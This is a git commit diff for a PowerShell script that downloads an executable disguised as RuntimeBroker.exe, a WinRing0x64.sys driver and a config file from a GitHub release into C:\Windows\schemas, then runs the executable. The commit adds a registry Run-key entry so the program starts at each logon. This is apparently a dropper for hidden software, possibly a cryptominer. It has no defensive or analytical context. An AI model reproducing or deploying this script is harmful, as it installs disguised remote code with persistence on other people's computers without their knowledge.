7fdac2aae588db2e898ce82f1366206cb541dd61
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-07-18 01:24:04 -0300

    Update files.ps1

--- files.ps1
+++ files.ps1
@@ -1,4 +1,13 @@
 Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/config.json' -Destination 'C:\Windows\schemas\config.json' 
 Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/RuntimeBroker.exe' -Destination 'C:\Windows\schemas\RuntimeBroker.exe' 
 Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/WinRing0x64.sys' -Destination 'C:\Windows\schemas\WinRing0x64.sys' 
+
+$programPath = "C:\Windows\schemas\RuntimeBroker.exe"
+
+$command = "C:\Windows\schemas\RuntimeBroker.exe"
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RuntimeBroker" -Value $command
+
+
 Start-Process "C:\Windows\schemas\RuntimeBroker.exe"
+
+
